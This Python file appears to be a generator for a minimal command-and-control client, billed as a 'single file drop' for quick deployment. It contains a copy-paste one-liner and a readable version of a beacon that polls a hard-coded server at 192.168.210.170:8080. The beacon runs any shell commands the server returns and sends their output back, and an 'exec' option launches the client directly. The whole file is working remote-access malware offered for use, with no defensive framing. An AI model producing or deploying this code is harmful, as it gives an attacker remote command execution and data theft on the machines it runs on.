#!/usr/bin/env python3
"""
Ultra-Minimal C2 Client - Single File Drop
Smallest possible footprint for quick deployment
"""

# One-liner version (copy/paste ready)
ONELINER = '''python3 -c "
import urllib.request as u,json,subprocess as s,time,platform as p,os
i=f'{p.node()}-{os.getpid()}';c='http://192.168.210.170:8080'
while 1:
 try:r=u.urlopen(f'{c}/api/clients/{i}',timeout=10);d=json.loads(r.read())
 except:time.sleep(10);continue
 for x in d.get('commands',[]):
  try:o=s.run(x['command'],shell=1,capture_output=1,text=1,timeout=30);u.urlopen(u.Request(f'{c}/api/results',json.dumps({'client_id':i,'command_id':x['id'],'result':{'stdout':o.stdout,'stderr':o.stderr,'exit_code':o.returncode}}).encode(),{'Content-Type':'application/json'}))
  except:pass
 time.sleep(5)
"'''

# Expanded readable version
EXPANDED = '''
import urllib.request
import json
import subprocess
import time
import platform
import os

# Configuration
client_id = f"{platform.node()}-{os.getpid()}"
c2_url = "http://192.168.210.170:8080"

print(f"[*] Minimal client {client_id} starting")

while True:
    try:
        # Check for commands
        response = urllib.request.urlopen(f"{c2_url}/api/clients/{client_id}", timeout=10)
        data = json.loads(response.read())
        
        # Execute commands
        for cmd_data in data.get("commands", []):
            try:
                result = subprocess.run(
                    cmd_data["command"],
                    shell=True,
                    capture_output=True,
                    text=True,
                    timeout=30
                )
                
                # Send result
                result_data = {
                    "client_id": client_id,
                    "command_id": cmd_data["id"],
                    "result": {
                        "stdout": result.stdout,
                        "stderr": result.stderr,
                        "exit_code": result.returncode
                    }
                }
                
                urllib.request.urlopen(
                    urllib.request.Request(
                        f"{c2_url}/api/results",
                        json.dumps(result_data).encode(),
                        {"Content-Type": "application/json"}
                    )
                )
            except:
                pass
        
    except:
        time.sleep(10)
        continue
    
    time.sleep(5)
'''

if __name__ == "__main__":
    import sys
    
    if len(sys.argv) > 1 and sys.argv[1] == "oneliner":
        print("# Ultra-minimal one-liner (copy and paste):")
        print(ONELINER.strip())
    elif len(sys.argv) > 1 and sys.argv[1] == "readable":
        print("# Readable version:")
        print(EXPANDED.strip())
    else:
        print("Minimal C2 Client Generator")
        print("Usage:")
        print("  python3 minimal_client.py oneliner   # Generate one-liner")
        print("  python3 minimal_client.py readable   # Generate readable version")
        print("  python3 minimal_client.py exec       # Execute directly")
        
        if len(sys.argv) > 1 and sys.argv[1] == "exec":
            print("\n[*] Executing minimal client...")
            exec(EXPANDED)